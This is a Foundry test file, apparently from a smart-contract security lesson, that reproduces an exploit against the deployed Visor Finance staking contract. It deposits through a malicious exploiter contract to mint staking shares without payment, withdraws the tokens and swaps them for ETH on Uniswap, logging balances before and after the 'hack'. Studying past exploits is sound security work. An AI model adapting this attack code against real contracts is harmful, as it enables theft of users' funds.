// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Lesson 2 - Visor.sol";
import "openzeppelin-contracts/token/ERC20/IERC20.sol";

contract VisorExploitTest is Test {
    VisorInterface public visor;
    VisorExploiter public visorExploitContract;
    UniswapV2Interface public uniswap;
    

    // setup function runs before tests begin
    function setUp() public {
        // The address of the deployed VisorStaking contract
        visor = VisorInterface(0xC9f27A50f82571C1C8423A42970613b8dBDA14ef);

        uniswap = UniswapV2Interface(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));

        // the malicious contract we want to deploy
        visorExploitContract = new VisorExploiter();

        vm.startPrank(address(0x7));
    }

    // anything prefixed with test will start with the
    function testVisor() public {
        // VM cheat code that sets address to 3
        console.log("ETH BALANCE BEFORE HACK: ", address(0x7).balance);
        visor.deposit(10e25, address(visorExploitContract), address(0x7));
        console.log("Balance of visor: ", IERC20(visor.vvisr()).balanceOf(address(0x7)));
        visor.withdraw(10e24, address(0x7), address(0x7));

        address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address visor_token = address(visor.visr());
        address[] memory path = new address[](2);
        path[0] = visor_token;
        path[1] = weth;
        IERC20(visor_token).approve(address(uniswap), 10e26);
        uint[] memory amounts = uniswap.swapExactTokensForETH(10e22, 0, path, address(0x7), 2650097619);
        console.log("total eth balance: ", address(0x7).balance);
    }
}
